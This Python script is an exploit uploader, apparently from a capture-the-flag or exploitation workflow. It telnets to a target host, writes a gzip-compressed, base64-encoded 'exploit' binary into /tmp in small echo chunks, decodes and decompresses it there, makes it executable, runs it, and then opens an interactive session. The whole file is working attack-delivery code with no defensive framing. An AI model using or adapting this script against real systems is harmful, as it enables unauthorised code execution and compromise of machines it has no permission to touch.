import base64
import telnetlib
import gzip


chunk_size = 256

# target IP and port
ip = 'x.x.x.x'
port = 1234

file_name = 'exploit'
file_name_encoded = file_name.encode()

with open(file_name, 'rb') as inf:
    exploit = inf.read()

data = base64.b64encode(gzip.compress(exploit))

telnet = telnetlib.Telnet(ip, port)
# wait until the command prompt appears
telnet.read_until(b'$')

n_chunks = len(data) // chunk_size
n_chunks += 1 if len(data) % chunk_size else 0

for i in range(n_chunks):
    print(f'\rUploading the exploit: {i}/{n_chunks}', end='')
    # echo <base64> >> /tmp/<file>.base64
    telnet.write(b'echo ' + data[chunk_size*i: (i+1)*chunk_size] + b' >> /tmp/' + file_name_encoded + b'.base64\n')
    telnet.read_until(b'$')

print(f'\rUploading the exploit: {n_chunks}/{n_chunks}')
# base64 decode
# cat /tmp/<file>.base64 | base64 -d > /tmp/<file>.gz
telnet.write(b'cat /tmp/' + file_name_encoded + b'.base64 | base64 -d > /tmp/' + file_name_encoded + b'.gz\n')
telnet.read_until(b'$')
# gzip decompress
# cat /tmp/<file>.gz | gzip -d > /tmp/<file>
telnet.write(b'cat /tmp/' + file_name_encoded + b'.gz | gzip -d > /tmp/' + file_name_encoded + b'\n')
telnet.read_until(b'$')

# make the file executable
# chmod +x /tmp/<file>
telnet.write(b'chmod +x /tmp/' + file_name_encoded + b'\n')
telnet.read_until(b'$')
# run the exploit
telnet.write(b'/tmp/' + file_name_encoded + b'\n')
telnet.interact()
